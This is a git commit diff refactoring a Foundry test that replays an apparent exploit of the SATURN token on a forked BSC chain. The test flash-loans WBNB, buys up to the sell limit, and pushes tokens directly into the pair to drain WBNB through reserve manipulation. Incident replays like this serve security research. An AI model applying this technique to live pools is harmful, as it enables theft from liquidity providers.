4cb1ebacd2a3bb0c763d43b976c337e784c367e7
akshaynexus <akshaycm@hotmail.com>
2024-05-08 20:02:22 +0400

    refactor: full refactor for readability for saturn exp

--- src/test/2024-05/SATURN_exp.sol
+++ src/test/2024-05/SATURN_exp.sol
@@ -20,6 +20,7 @@ import "../interface.sol";
 contract ContractTest is Test {
     address public attacker = address(this);
     address public SATURN_creater = 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62;
+    address internal holderOfToken = 0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC;
 
     Uni_Pair_V3 pancakeV3Pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
     IPancakePair pair_WBNB_SATURN = IPancakePair(0x49BA6c20D3e95374fc1b19D537884b5595AA6124);
@@ -28,9 +29,17 @@ contract ContractTest is Test {
     IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
 
-    
+    uint256 flashAmt = 3300 ether;
+    uint256 finalSaturnSellAmt = 228_832_951_945_080_091_523_153;
+
+    modifier balanceLog() {
+        emit log_named_decimal_uint("Attacker WBNB Balance Before exploit", WBNB.balanceOf(address(this)), 18);
+        _;
+        emit log_named_decimal_uint("Attacker WBNB Balance After exploit", WBNB.balanceOf(address(this)), 18);
+    }
+
     function setUp() public {
-        vm.createSelectFork("bsc", 38488209-1);
+        vm.createSelectFork("bsc", 38_488_209 - 1);
         vm.label(address(SATURN), "SATURN");
         vm.label(address(WBNB), "WBNB");
         vm.label(address(router), "PancakeSwap Router");
@@ -42,74 +51,85 @@ contract ContractTest is Test {
         SATURN.approve(address(router), type(uint256).max);
         WBNB.approve(address(router), type(uint256).max);
     }
-    
-    function testExploit() public {
-        approveAll();
-        // init saturn token
+
+    function EnableSwitch(bool state) internal {
         vm.prank(SATURN_creater);
-        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", false));
-        
-        uint256 attacker_amount = SATURN.balanceOf(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
-        vm.prank(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC);
-        SATURN.transfer(attacker, attacker_amount);
-
-        vm.prank(SATURN_creater);
-        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", true));
-
-        // start attack
-        pancakeV3Pool.flash(
-            attacker,
-            0,
-            3300000000000000000000,
-            bytes("")
-        );
-
+        address(SATURN).call(abi.encodeWithSignature("setEnableSwitch(bool)", state));
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
-        (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
-        (uint256 limit) = abi.decode(result, (uint256));
+    function testExploit() public balanceLog {
+        approveAll();
+        // init saturn token
+
+        EnableSwitch(false);
+
+        vm.startPrank(holderOfToken);
+        SATURN.transfer(attacker, SATURN.balanceOf(holderOfToken));
+        vm.stopPrank();
+
+        EnableSwitch(true);
+
+        // start attack
+        pancakeV3Pool.flash(attacker, 0, flashAmt, bytes(""));
+    }
+
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+        // Get the everyTimeSellLimitAmount from the SATURN contract
+        uint256 limit = getEveryTimeSellLimitAmount();
+
+        // Get the current balance of SATURN in the pair_WBNB_SATURN pool
         uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
 
-        address[] memory path = new address[](2);
-        path[0] = address(WBNB);
-        path[1] = address(SATURN); 
+        // Define the swap paths
+        address[] memory buyPath = getPath(address(WBNB), address(SATURN));
+        address[] memory sellPath = getPath(address(SATURN), address(WBNB));
 
-        uint256[] memory amounts = router.getAmountsIn(amount - limit, path);
-        router.swapExactTokensForTokens(
-            amounts[0],
-            0,
-            path,
-            SATURN_creater,
-            type(uint256).max
-        );
+        // Calculate the amount of WBNB needed to swap for SATURN
+        uint256[] memory amounts = router.getAmountsIn(amount - limit, buyPath);
 
+        // Swap WBNB for SATURN and send the SATURN to the SATURN_creater
+        swapExactTokensForTokens(amounts[0], buyPath);
+
+        // Update the amount of SATURN in the pair_WBNB_SATURN pool
         amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
 
-
-
+        // Move the block number forward by 1
         vm.roll(block.number + 1);
-        SATURN.transfer(address(pair_WBNB_SATURN), 228832951945080091523153);
-        (uint256 SATURN_reserve, uint256 WBNB_reserve, ) = pair_WBNB_SATURN.getReserves();
+
+        // Transfer a specific amount of SATURN to the pair_WBNB_SATURN pool
+        SATURN.transfer(address(pair_WBNB_SATURN), finalSaturnSellAmt);
+
+        // Get the current reserves of SATURN and WBNB in the pair_WBNB_SATURN pool
+        (uint256 SATURN_reserve, uint256 WBNB_reserve,) = pair_WBNB_SATURN.getReserves();
+
+        // Update the amount of SATURN in the pair_WBNB_SATURN pool
         amount = SATURN.balanceOf(address(pair_WBNB_SATURN));
-        path[0] = address(SATURN);
-        path[1] = address(WBNB); 
-        amounts = router.getAmountsOut(amount - SATURN_reserve, path);
-        
-        pair_WBNB_SATURN.swap(
-            0,
-            amounts[1],
-            attacker,
-            bytes("")
-        );
-        WBNB.transfer(address(pancakeV3Pool), 3300000000000000000000+fee1);
+
+        // Calculate the amount of WBNB that will be received when swapping SATURN
+        amounts = router.getAmountsOut(amount - SATURN_reserve, sellPath);
+
+        // Perform the swap in the pair_WBNB_SATURN pool and send the WBNB to the attacker
+        pair_WBNB_SATURN.swap(0, amounts[1], attacker, bytes(""));
+
+        // Transfer WBNB to the pancakeV3Pool, including the fee
+        WBNB.transfer(address(pancakeV3Pool), flashAmt + fee1);
+    }
+
+    function getEveryTimeSellLimitAmount() internal returns (uint256) {
+        (, bytes memory result) = address(SATURN).call(abi.encodeWithSignature("everyTimeSellLimitAmount()"));
+        return abi.decode(result, (uint256));
+    }
+
+    function swapExactTokensForTokens(uint256 amountIn, address[] memory path) internal {
+        router.swapExactTokensForTokens(amountIn, 0, path, SATURN_creater, type(uint256).max);
+    }
+
+    function getPath(address token0, address token1) internal pure returns (address[] memory) {
+        address[] memory path = new address[](2);
+        path[0] = token0;
+        path[1] = token1;
+        return path;
     }
 
     fallback() external payable {}
 }
-
-
